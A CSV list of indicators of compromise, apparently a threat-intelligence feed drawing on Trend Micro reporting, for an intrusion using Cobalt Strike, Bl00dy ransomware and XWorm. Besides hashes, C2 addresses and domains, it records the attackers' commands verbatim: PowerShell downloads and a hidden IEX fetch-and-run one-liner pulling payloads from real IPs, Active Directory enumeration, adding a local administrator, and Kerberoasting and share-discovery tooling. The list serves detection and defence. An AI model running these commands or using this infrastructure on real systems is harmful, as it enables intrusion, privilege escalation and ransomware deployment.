Type,Data,Note
"STRING","powershell.exe -c ""$D=[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain();$L='LDAP://'.$D;$D = [ADSI]$L;$Date = $((Get-Date).AddDays(-90).ToFileTime());$str = '(&(objectcategory=computer)(|(lastlogon>='+$Date+')(lastlogontimestamp>='+$Date+')))';$s = [adsisearcher]$str;$s.searchRoot = $L.$D.distinguishedName;$s.PageSize = 10000;$s.PropertiesToLoad.Add('cn') > $Null;Foreach ($CA in $s.FindAll()){;$i++;}; Write-Output Total computers: $i""","Trendmicro: Powershell command"
"STRING","powershell.exe  iwr http://207.246.74.189:804/download/Diablo.log -outfile %PUBLIC%\Diablo.log","Trendmicro: Powershell command"
"STRING","powershell.exe iwr http://51.195.192.120:804/download/09D.log -outfile %PUBLIC%\09D.log","Trendmicro: Powershell command"
"STRING","powershell.exe iwr http://198.244.169.213:8045/download/10443.exe -outfile %PUBLIC%\10443.exe","Trendmicro: Powershell command"
"STRING","powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://159[.]65[.]130[.]146:4444/a'))""","Trendmicro: Powershell command"
"DOMAIN","dns.artstrailreviews.com","TrendMicro: Cobalt Strike C&C server"
"SHA256","11d2dde6c51e977ed6e3f3d3e256c78062ae41fe780aefecfba1627e66daf771","TrendMicro: Cobalt Strike"
"SHA256","cc13b5721f2ee6081c1244dd367a9de958353c29e32ea8b66e3b20b293fabc55","TrendMicro: Cobalt Strike"
"SHA256","e3401d7699cc5067620e43bd24e8ccd437832c16f2fa7d5baaad8c170383cc92","TrendMicro: Cobalt Strike"
"SHA256","fa131238c3c35efe99cde59dd409c0436fd642b6bf5d56f994f52ab3a62bae4e","TrendMicro: Cobalt Strike"
"SHA256","764c53ea8ab98e4720ec55876c1b656d38e5e225c3835ffba491f64fa6b24b00","TrendMicro: Cobalt Strike"
"SHA256","3a659609850664cbc0683c8c7b92be816254eb9306e7fb12ad79d5a9af0fb623","TrendMicro: Bl00dy ransomware"
"SHA256","8e51de4774d27ad31a83d5df060ba008148665ab9caf6bc889a5e3fba4d7e600","TrendMicro: Bl00dy ransomware"
"SHA256","444338339260d884070de53554543785acc3c9772e92c5af1dff96e60e67c195","TrendMicro: XWorm malware"
"SHA256","47d83461ee57031fd2814382fb526937a4cfa9a3eea7a47e4e7ee185c0602b27","TrendMicro: XWorm malware"
"IPV4","159.65.130.146","TrendMicro: Cobalt Strike C&C server"
"DOMAIN","wipresolutions.com","TrendMicro: Cobalt Strike C&C server"
"URL","http://23.26.137.225:8084/msappdata.msi","TrendMicro: Bl00dy ransomware source"
"URL","http://23.26.137.225:8091/chromeset.exe","TrendMicro: Bl00dy ransomware source"
"DOMAIN","input-beats.gl.at.ply.gg","TrendMicro: XWorm C&C"
"DOMAIN","scamkiller.duckdns.org","TrendMicro: XWorm C&C"
"STRING","net.exe group ""Domain Admins"" /domain","Trendmicro: Command"
"STRING","net.exe localgroup Administrators Adminis /add","Trendmicro: Command"
"STRING","nltest.exe /domain_trusts /all_trusts","Trendmicro: Command"
"IPV4","23.26.137.225","TrendMicro: Bl00dy ransomware source"
"URL","http://198[.]244.169.213:8045/download/10443.exe","Trendmicro Report"
"FILENAME","%PUBLIC%\10443.exe","Trendmicro Report"
"URL","http://51.195.192.120:804/download/09D.log","Trendmicro Report"
"FILENAME","%PUBLIC%\09D.log","Trendmicro Report"
"URL","http://207.246.74.189:804/download/Diablo.log","Trendmicro Report"
"FILENAME","%PUBLIC%\Diablo.log","Trendmicro Report"
"IPV4","207.246.74.189","Trendmicro Report"
"IPV4","51.195.192.120","Trendmicro Report"
"IPV4","198.244.169.213","Trendmicro Report"
"SHA256","6ead21965781303e88efc9fcce8578578d6d200dcb37e413bf1e21336d93db33","Reconnaissance: sharp shares"
"FILENAME","sh.exe","Reconnaissance: sharp shares"
"DOMAIN","dns.webnubee.com","DNS tunneling"
"STRING","powershell.exe -c","Enumeration"
"FILENAME","Kerberoast.ps1","Kerberoasting"
"SHA256","f21240e0bf9f0a391d514e34d4fa24ecb997d939379d2260ebce7c693e55f061","1.exe (7zg.exe on VT)"
"FILENAME","1.exe","7zg.exe on VT"
"IPV4","45.11.183.110","Destination was pinged by threat actor. Probably C2"
"IPV4","198.244.135.245","Destination was pinged by threat actor. Probably C2"
"IPV4","91.134.207.30","Destination was pinged by threat actor. Probably C2"
"IPV4","37.10.71.143","Destination was pinged by threat actor. Probably C2"
"IPV4","170.130.165.44","Destination was pinged by threat actor. Probably C2"
"IPV4","15.204.170.49","Destination was pinged by threat actor. Probably C2"
"IPV4","79.132.135.149","Destination was pinged by threat actor. Probably C2"
"IPV4","170.130.165.132","Destination was pinged by threat actor. Probably C2"
"IPV4","79.132.130.60","Destination was pinged by threat actor. Probably C2"
"IPV4","91.134.187.17","Destination was pinged by threat actor. Probably C2"
"DOMAIN","webnubee.com","Destination was pinged by threat actor. Probably C2"
"DOMAIN","startupbuss.com","Destination was pinged by threat actor. Probably C2"
"DOMAIN","artspathgroup.net","Destination was pinged by threat actor. Probably C2"
"IPV4","144.202.38.240","Destination was pinged by threat actor. Probably C2"
"DOMAIN","buyblocknow.com","Destination was pinged by threat actor. Probably C2"
"DOMAIN","trailcosolutions.com","Destination was pinged by threat actor. Probably C2"
"DOMAIN","temp.sh","Destination was pinged by threat actor. Probably C2"
"IPV4","198.27.121.195","Destination was pinged by threat actor. Probably C2"
"IPV4","151.80.52.32","Destination was pinged by threat actor. Probably C2"
"URL","http://91.134.207.30:801/download/ibm_inet.dll","DLL Download via Powershell"
"FILENAME","%PUBLIC%\ibm_inet.dll","DLL Download via Powershell"
"FILENAME","1.txt","Outputfile of sh.exe execution"
"FILENAME","%PUBLIC%\16DNS\7zG.exe","7z used by attackers"
"STRING","net user /DOMAIN","Command executed by attackers"
"STRING","whoami /all","Command executed by attackers"
"FILENAME","%USERPROFILE%\Documents\Invoke-Sharpshares.ps1","Sharp Share Powershell script"
"FILENAME","Invoke-Sharpshares.ps1","Sharp Share Powershell script"
"STRING","sh.exe /ldap:all /threads:50 /outfile:1.txt","Command executed by attackers"
"STRING","sh.exe shares","Command executed by attackers"
"FILENAME","\\tsclient\C\16_DNS.ps1","Executed by attacker"
